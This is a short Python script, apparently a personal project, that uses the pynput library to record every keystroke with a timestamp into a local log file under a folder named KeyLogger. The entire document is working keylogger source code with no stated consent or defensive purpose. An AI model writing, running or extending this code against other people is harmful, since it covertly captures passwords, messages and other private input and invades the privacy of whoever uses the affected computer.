from pynput.keyboard import Key, Listener
import logging

file_log = "D:\Desktop\Python\Project1\KeyLogger\log2.txt"

logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s %(message)s')

def on_press(Key):
    logging.info(str(Key))

with Listener(on_press=on_press) as listener2:
    listener2 = listener2.join()
